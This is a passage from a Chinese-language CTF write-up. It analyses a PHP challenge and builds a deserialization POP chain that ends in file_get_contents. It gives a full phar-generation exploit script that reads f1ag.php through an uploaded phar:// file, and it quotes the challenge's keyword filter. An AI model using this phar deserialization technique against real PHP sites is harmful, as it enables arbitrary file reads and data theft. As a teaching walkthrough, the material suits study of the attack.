</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/http|https|file:|gopher|dict|\.\./i&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;hacker~&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="s2">&#34;index.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$params</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span>   <span class="c1">//  传入点
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">get</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span><span class="p">[</span><span class="nv">$key</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$value</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span><span class="p">[</span><span class="nv">$key</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$value</span> <span class="o">=</span> <span class="s2">&#34;index.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_get</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">file_get</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$text</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$value</span><span class="p">));</span>  <span class="c1">// 任意文件读取点
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="nv">$text</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><ol>
<li>
<p>调用<code>Test</code>类中的<code>file_get()</code>方法任意文件读取，<code>get()</code>会调用<code>file_get()</code>方法，传入<code>$value</code>参数，if判断<code>$this-&gt;params[$key]</code>是否有值，没有则传<code>index.php</code>给<code>file_get</code>去读取。但是前面还有一个构造函数<code>__contruct()</code>，定义<code>params</code>为一个数组，<code>__get</code>则去调用<code>get()</code>方法，所以只要触发<code>__get()</code> 方法即可～ ，<code>__get()</code> 魔术方法在<code>读取不存在的属性</code>自动触发！</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">Test</span><span class="o">::</span><span class="na">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nx">Test</span><span class="o">::</span><span class="na">__get</span><span class="p">()</span> <span class="o">--&gt;</span> <span class="nx">get</span><span class="p">()</span> <span class="o">--&gt;</span> <span class="nx">file_get</span><span class="p">()</span><span class="o">.</span><span class="nx">file_get_contents</span><span class="p">()</span> <span class="c1">// 读取文件
</span></span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p><code>Show</code>类中的<code>__toString()</code>中的<code>$content = $this-&gt;str['str']-&gt;source</code>则是获取一个叫<code>source</code>的属性。假设<code>str['str'] = new Test()</code>读取不存在的属性<code>source</code>刚好就能触发<code>__get()</code>方法！</p>
</li>
<li>
<p><code>__toString()</code>把对象当成字符输出自动触发～，在<code>C1e4r</code>中<code>__destruct()</code>对象被销毁触发，能打印输出值，只要设置<code>$this-&gt;test</code>为<code>new show()</code>对象即可，</p>
</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1"># 构造
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nx">C1e4r</span><span class="o">::</span><span class="na">__destruct</span> <span class="o">--&gt;</span> <span class="nx">Show</span><span class="o">::</span><span class="na">toString</span><span class="p">()</span> <span class="o">--&gt;</span>  <span class="nx">Test</span><span class="o">::</span><span class="na">__get</span><span class="p">()</span> <span class="o">--&gt;</span><span class="nx">get</span><span class="p">()</span><span class="o">--&gt;</span><span class="nx">file_get_contents</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>POP：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">C1e4r</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Show</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$params</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">C1e4r</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$show</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$test</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Test</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$test</span><span class="o">-&gt;</span><span class="na">parms</span><span class="p">[</span><span class="s1">&#39;source&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&#34;/var/www/html/f1ag.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">// 为什么设置&#39;source&#39;? 因为: $this-&gt;str[&#39;str&#39;]-&gt;source;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$c</span><span class="o">-&gt;</span><span class="na">str</span> <span class="o">=</span> <span class="nv">$show</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$show</span><span class="o">-&gt;</span><span class="na">str</span><span class="p">[</span><span class="s1">&#39;str&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$test</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">=</span><span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;mm.phar&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s1">&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>     
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span> <span class="c1">// 生成签名
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>function.php</code>限制上传的文件后缀，但是到最后都会被命名为<code>xxxxxx.jpg</code>文件。<code>mm.phar</code>改成png结尾，</p>
<p>上传文件，然后利用phar伪协议<code>http://xxxxx/file.php?file=phar://upload/xxxx.jpg</code></p>

    </div>
    <div class="post-footer">
      <div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
    </div>
  </article>

    </main>
  </body>
</html>
